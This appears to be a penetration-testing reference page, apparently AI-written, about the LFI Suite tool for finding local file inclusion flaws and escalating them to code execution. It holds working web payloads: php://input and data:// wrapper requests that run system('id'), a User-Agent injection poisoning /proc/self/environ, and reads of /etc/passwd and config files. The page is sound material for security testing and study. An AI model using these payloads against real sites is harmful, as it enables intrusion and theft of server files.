# LFI Suite

**Tags:** `#lfi` `#localfileinclusion` `#rce` `#webappsec` `#web`

Automated LFI scanner and exploiter. Combines a scanner to detect LFI vulnerabilities with an exploiter that attempts RCE via multiple escalation techniques — log poisoning, /proc/self/environ, PHP filters, and PHP input wrappers. Provides a reverse shell if escalation succeeds.

**Source:** https://github.com/D35m0nd142/LFISuite
**Install:**
```bash
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
pip install pyftpdlib
python lfisuite.py
```

> [!note]
> LFI Suite offers both a scanner (finds LFI) and an exploiter (escalates to RCE). The tool is Python 2 — may need `python2 lfisuite.py`. See also LFiFreak and liffy for alternatives. Manual Burp testing with PHP wrappers is more reliable for complex cases.

---

## Usage

```bash
# Launch
python lfisuite.py
# or
python2 lfisuite.py

# Menu options:
# 1. Scanner  — detect LFI in target
# 2. Exploiter — escalate known LFI to RCE
# 3. Auto     — scan + exploit
```

---

## Scanner Mode

```bash
# Input: URL with LFI parameter marked
# Example URL: http://target.com/page.php?file=LFISUITE
# The tool replaces LFISUITE with payloads

# Tests:
# - Path traversal (various depths)
# - Null byte injection
# - Filter bypass techniques
# - Common file targets (/etc/passwd, /etc/hosts, etc.)
```

---

## Exploiter Mode

```bash
# Input: confirmed LFI URL
# Escalation techniques tried:
# 1. /proc/self/environ poisoning
# 2. Apache/Nginx access log poisoning
# 3. PHP input wrapper (php://input)
# 4. PHP filter (php://filter)
# 5. /proc/self/fd/* file descriptors
# 6. Email log (/var/mail/www-data)
# 7. SSH log poisoning (/var/log/auth.log)

# If successful → reverse shell to attacker IP:port
```

---

## LFI Technique Reference

```bash
# PHP filter — read source (no RCE, but useful for code review)
http://target.com/page.php?file=php://filter/read=convert.base64-encode/resource=config.php
# Decode output:
echo "BASE64OUTPUT" | base64 -d

# PHP input (RCE via POST — needs allow_url_include=On)
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('id'); ?>"

# Data wrapper (RCE — needs allow_url_include=On)
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# /proc/self/environ (needs readable by web process)
http://target.com/page.php?file=/proc/self/environ
# After injecting PHP into User-Agent:
curl -A "<?php system('id'); ?>" "http://target.com/page.php?file=/proc/self/environ"
```

---

## Wordlists for LFI Path Traversal

```bash
# SecLists LFI wordlists
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Use with ffuf
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "http://target.com/page.php?file=FUZZ" \
  -fc 200 -fs 1234
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
